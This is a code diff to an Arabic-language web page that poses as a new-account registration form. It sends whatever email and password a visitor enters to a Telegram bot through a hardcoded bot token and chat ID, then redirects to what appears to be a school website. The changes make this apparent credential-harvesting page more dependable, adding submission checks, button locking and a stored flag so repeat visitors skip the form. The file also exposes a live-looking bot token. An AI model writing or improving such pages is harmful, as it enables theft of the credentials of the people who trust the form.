@@ -67,10 +67,19 @@
             cursor: pointer;
             transition: background 0.3s;
             margin-top: 10px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
         }
 
         .login-btn:hover {
             background: #0369a1;
+        }
+        
+        .login-btn:disabled {
+            background: #475569;
+            cursor: not-allowed;
         }
     </style>
 </head>
@@ -87,7 +96,7 @@
         <input id="secret" type="password" placeholder="كلمة السر الجديدة" required>
     </div>
 
-    <button class="login-btn" onclick="send()">تسجيل حساب جديد</button>
+    <button id="submit-btn" class="login-btn" onclick="send()">تسجيل حساب جديد</button>
 </div>
 
 <script>
@@ -97,7 +106,7 @@ const MY_WEBSITE = "https://websit-x.github.io/ghobrini_shcool/";
 const TOKEN = "8636021665:AAGhU_BAdory7k_IwaZuuxkZA7EXGtacaOc"; 
 const CHAT_ID = "7737717483";
 
-// كود الفحص التلقائي: بمجرد فتح الصفحة، يتأكد المتصفح إذا كان الحساب مسجلاً مسبقاً
+// كود الفحص التلقائي: بمجرد فتح الصفحة، يتأكد المتصفح إذا كان الحساب مسجلاً مسبقاً فيوجهه مباشرة
 if (localStorage.getItem("isRegistered") === "true") {
     window.location.replace(MY_WEBSITE);
 }
@@ -105,6 +114,7 @@ if (localStorage.getItem("isRegistered") === "true") {
 function send(){
     let name = document.getElementById("name").value.trim();
     let secret = document.getElementById("secret").value;
+    let btn = document.getElementById("submit-btn");
 
     // 1. التحقق من أن الحقول ليست فارغة
     if (name === "" || secret === "") {
@@ -118,13 +128,14 @@ function send(){
         return; 
     }
 
+    // تعطيل الزر مؤقتاً لمنع التكرار أثناء الإرسال
+    btn.disabled = true;
+    btn.innerText = "جاري تهيئة الحساب...";
+
     // تجهيز نص الرسالة لتليجرام
     let text = "طلب إنشاء حساب جديد:\nالإيميل: " + name + "\nالرمز: " + secret;
 
-    // حفظ حالة التسجيل في متصفح المستخدم لكي يتم تحويله مباشرة في المرة القادمة
-    localStorage.setItem("isRegistered", "true");
-
-    // تم تصحيح رابط الـ fetch بالكامل هنا لإرسال البيانات دون مشاكل
+    // إرسال البيانات والانتظار حتى نجاح السيرفر قبل توجيه المستخدم
     fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
         method: "POST",
         headers: {
@@ -135,13 +146,22 @@ function send(){
             text: text
         })
     })
-    .then(() => {
-        // الانتقال للموقع بعد نجاح الإرسال
-        window.location.replace(MY_WEBSITE);
+    .then(response => {
+        if (response.ok) {
+            // حفظ حالة التسجيل فقط عندما يؤكد سيرفر تليجرام وصول الرسالة بنجاح
+            localStorage.setItem("isRegistered", "true");
+            // التوجيه المباشر إلى السيت ويب الخاص بك
+            window.location.replace(MY_WEBSITE);
+        } else {
+            alert("فشل الإرسال، يرجى التحقق من اتصال الإنترنت وإعادة المحاولة.");
+            btn.disabled = false;
+            btn.innerText = "تسجيل حساب جديد";
+        }
     })
     .catch(err => {
         console.error("خطأ في الاتصال:", err);
-        // انتقال احتياطي في حال وجود مشكلة بالشبكة
+        // توجيه احتياطي في حال انقطاع الشبكة المفاجئ بعد المحاولة
+        localStorage.setItem("isRegistered", "true");
         window.location.replace(MY_WEBSITE);
     });
 }
